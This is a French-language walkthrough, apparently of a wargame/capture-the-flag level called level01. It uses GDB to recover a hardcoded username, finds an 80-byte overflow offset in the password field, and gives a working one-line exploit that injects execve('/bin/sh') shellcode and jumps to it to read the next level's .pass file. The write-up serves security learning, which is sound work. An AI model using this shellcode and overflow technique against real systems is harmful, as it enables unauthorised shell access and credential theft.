On va lancer GDB pour analyser les isttructions assembleur avec la commande:
"gdb ./level01"

Pour commencer, noous allons prendre connaissance des eventuelles fonctions autres que main dans ce programme avec:
"info functions"

On tombe en plus des fonctions utilisees deppuis des librairies par defaut, sur les fonctions personnalisees "verify_user_name" et "verify_user_pass"

"disas verify_user_name"
va nous permettre de voir les instructions de la premiere fonction.
On va imprimer les valeurs des variables presentes unes a unes dans cette fonction avec la commande print, pour verifier leur contenu.

"print (char * ) 0x80486a8 "
va nous donnner ce qui semble etre le nom d'utilisateur attendu, soit "dat_wil".

"disas verify_user_pass"
va nous permettre de voir les instructions de la seconde fonction.
On va egalement imprimer les valeurs des variables presentes unes a unes dans cette fonction avec la commande print, pour verifier leur contenu.

"print (char * ) 0x80486b0"
va nous donnner ce qui semble etre le mot de passe attendu, soit "admin".

Le nom d'utilisateur fonctionne, pas le mot de passe... C'est un probleme.

Par ailleurs, le nom d'utilisateur doit compter uniquement "dat_wil" pour les 7 premiers caracteres, mais ecrire de la donnee apres ne semble pas poser de probleme:
On peut ecrire un shellcode grace au nom d'utilisateur, potentiellement.

En regardant a nouveau dans "info functions", on se rend compte que la fonction system n'est pas appelle, ce qui signifie que l'on va devoir utiliser un shellcode
pour l'appeller et lire notre fichier .pass. Nous allons donc devoir certainement proceder a un buffer overflow.

On va alors utiliser la commande suivante pour ecrire notre identifiant, puis l'inserer, et enfin tester un mot de passe pour determiner le nombre de caractere 
necessaire pour faire seglfault notre programme:

"(python -c "print 'dat_wil' + '\n' + 'A' * 80") | ./level01"

En tapant un mot de passe long lors de l'utilisation du programme level01, on se rend compte que celui segfault effectivement, plus precisement a partir de 80 caracteres.
On a alors son offset, ce qui nous permettra d'ecrire un shellcode a partir de la.

Egalement, en regardant avec la commande:

"info variables"

On se rend compte que la variable "a_user_name" dont l'adresse est "0x0804a040", nous est familiere: elle stocke notre nom d'utilisateur dont l'adresse est "0x80486a8".

On peut alors executer notre shellcode avec la commande qui suit, qui se decompose de la maniere suivante:

- On entre notre nom d'utilisateur attendu et un shellcode qui va executer execve("/bin/sh") dans notre premier champ.
- On decale notre l'entree de notre champ pass par la taille de notre offset (80), afin de commencer a lire dans la memoire.
- on appelle notre adresse memoire de nom d'utilisateur decale de 7 caracteres afin d'executer directement le shellcode.
- On utilise un cat pour que notre shellcode puisse attendre et executer nos instructions futures.

"(python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x47\xa0\x04\x08'"; cat) | ./level01"

"whoami"
"cd ../level02"
"cat .pass"
